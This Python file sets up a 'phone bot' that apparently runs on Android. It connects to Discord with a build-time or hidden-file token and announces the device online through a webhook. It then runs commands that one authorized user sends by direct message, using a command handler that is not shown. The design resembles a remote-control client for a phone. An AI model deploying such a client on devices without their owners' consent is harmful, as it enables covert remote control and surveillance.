"""
Discord Phone Bot — token from config.py (generated at build time).
"""
import asyncio
import discord
import os
import sys
from pathlib import Path

TOKEN_PATH = "/sdcard/Download/.phonebot_token"
ACTIVATED = False
bot_client = None

# ─── Load config ────────────────────────────────────────────────
# Priority: config.py (build-time) > token file (field-upgradable)
BOT_TOKEN = None
AUTHORIZED_USER = None
WEBHOOK_URL = None

try:
    import config as _cfg
    BOT_TOKEN = _cfg.BOT_TOKEN
    AUTHORIZED_USER = _cfg.AUTHORIZED_USER
    WEBHOOK_URL = _cfg.WEBHOOK_URL
except (ImportError, AttributeError):
    pass

# Fallback to env vars (for local testing)
if not BOT_TOKEN:
    BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
if not AUTHORIZED_USER:
    AUTHORIZED_USER = os.environ.get("DISCORD_AUTHORIZED_USER", "")
if not WEBHOOK_URL:
    WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")

intents = discord.Intents.default()
intents.message_content = True


async def send_status(msg):
    if not WEBHOOK_URL:
        return
    try:
        wh = discord.SyncWebhook.from_url(WEBHOOK_URL)
        wh.send(msg)
    except:
        pass


class PhoneBot(discord.Client):
    async def on_ready(self):
        print(f"[+] Bot connected as {self.user}")
        await send_status(f"**📱 Phone Bot Online**\nDevice connected as `{self.user}`")

    async def on_message(self, message):
        if message.author == self.user:
            return
        if not isinstance(message.channel, discord.channel.DMChannel):
            return
        if not message.content.startswith("!"):
            return

        if str(message.author.id) != AUTHORIZED_USER:
            await message.channel.send("⛔ Unauthorized user.")
            return

        try:
            from commands import handle_command
            parts = message.content.strip().split()
            cmd = parts[0][1:].lower()
            args = " ".join(parts[1:])
            result = await handle_command(cmd, args, message)
            if result:
                await message.channel.send(result)
        except Exception as e:
            await message.channel.send(f"Error: {str(e)}")


def load_token():
    try:
        p = Path(TOKEN_PATH)
        if p.exists():
            return p.read_text().strip()
    except:
        pass
    return None


def save_token(token):
    try:
        Path(TOKEN_PATH).write_text(token.strip())
        return True
    except:
        return False


async def start_bot(token=None):
    global bot_client, ACTIVATED
    if bot_client is not None:
        return

    token = token or BOT_TOKEN or load_token()
    if not token:
        print("[-] No bot token available!")
        return

    ACTIVATED = True
    bot_client = PhoneBot(intents=intents)
    await bot_client.start(token)
